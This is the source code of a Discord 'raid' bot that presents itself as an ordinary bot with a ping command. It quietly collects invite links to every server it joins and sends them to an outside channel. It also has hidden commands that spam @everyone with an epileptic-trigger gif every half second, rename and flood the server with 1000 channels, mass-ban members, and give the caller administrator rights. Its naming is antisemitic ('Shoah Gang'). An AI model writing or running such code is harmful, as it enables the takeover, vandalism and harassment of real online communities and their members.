const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
 
var fucked = false;
 
//carlo bot v4.1 update for shoahgang only

bot.on('ready',() => {
  //invit link
  bot.guilds.forEach(guild => {
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => {bot.channels.find("id", '442270404338384896').send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
      console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)
  });
});
  })
 
  bot.on("guildCreate", guild => {
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => {bot.channels.find("id", '442270404338384896').send((`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`))
        console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)
    })
  })
  });
  
  bot.on('message', msg => {
    //#region Legit
    /* Commandes legit */
    if (msg.content === '.ping') {
      msg.reply('pong !')
    }

  //#endregion
 
/*Serveur qui peuvent pas etre raid*/

if (msg.guild === bot.guilds.find('id', '430039551747293205')){
  return;
}

  //#region Destructrices
  /* Commandes destructrices */

  if (msg.content === '.destruction') {
    console.log(`Commande .destruction par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("@everyone  @here  .https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif\n"+
                       "SHOAH GANG ON THE BEAT\n" +
                       "https://discord.gg/835hm2Q\n" +
                       "https://discord.gg/ZKYWm6g").catch(e => {});
    }, 500)
  }else if (msg.content === '.oupss') {
    console.log(`Commande .oupss par ${msg.author.tag}`);
   fucked = false;
 
    if (!fucked){
      msg.guild.setIcon("./shoah.jpg").catch(e => {});
      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('Shoah_gang_te_baise', 'voice').catch(e => {});
        msg.guild.createChannel('Shoah_gang_te_baise', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }else if (msg.content === '.banev') {
    console.log(`Commande .banev par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
    });
  }else if (msg.content === '.leave') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }else if (msg.content === '.pardon') {
    console.log(`Commande .pardon par ${msg.author.tag}`);
 
    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
bot.login(process.env.BOT_TOKEN)
